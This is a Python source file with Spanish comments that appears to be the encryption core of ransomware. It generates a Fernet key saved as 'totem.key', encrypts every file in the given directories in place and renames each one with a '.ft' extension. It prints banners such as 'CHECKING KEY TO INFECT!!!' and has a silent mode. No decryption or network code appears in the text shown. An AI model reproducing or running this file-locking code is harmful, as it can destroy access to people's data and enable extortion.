from cryptography.fernet import Fernet
from time  import sleep
from os import system, rename
from os.path import splitext

# Funcion que genera el totem [pass]
def keygen():
    key = Fernet.generate_key()
    with open("totem.key","wb") as totem:
        totem.write(key)

#Funcion que lee el valor del totem
def getkey():
    try:
        keyfile = open("totem.key","rb").read()
        return keyfile    
    except:
        return None

def encrypt_name_file(file):
    f,ext = splitext(file)
    if ext != '.ft':
        rename(file,file+'.ft')

# Funcion que cifra un archivo
def encrypt_file(file, key, silent=False):
    fern = Fernet(key)
    try:
        with open(file,"rb") as target_r:
            target_data = target_r.read()
        data_encrypt = fern.encrypt(target_data)
        with open(file, "wb") as target_w:
            target_w.write(data_encrypt)
        encrypt_name_file(file)
    except:
        if silent == False:
            print("[X] -> ERROR ENCRIPTED {:>35}\n"
            .format(file), end="")
            sleep(0.2)

# Funcion que cifra un directorio
def encrypt_dirs(lst_dir=[],silent=False):
    if len(lst_dir) > 0:
        while getkey() == None:
                keygen()
        print_encryption(silent)
        key = getkey()
        for index_dir in lst_dir:
                for lst_files,dir in index_dir.items():
                    for file in index_dir[lst_files]:
                        encrypt_file(file=file,key=key,silent=silent)
                        if silent == False:
                            print("[$] -> FILE ENCRIPTED {:>35}\n"
                            .format(file.replace(lst_files+"/", "")+".ft"), end="")
                            sleep(0.2)

# Funcion verbose mode
def print_encryption(silent=False):
    if silent == False:
        print("""
            **************************************
            *|     CHECKING KEY TO INFECT!!!    |*
            **************************************\n""")
        sleep(0.5)
        print("*** KEY CHECKED ***")
        sleep(2)
        system('clear')
        print("""
            **************************************
            *|      STARTING ENCRYPTION!!!      |*
            **************************************\n""")
        sleep(0.5)
        print("*** ENCRYPING FILES ***")
        sleep(2)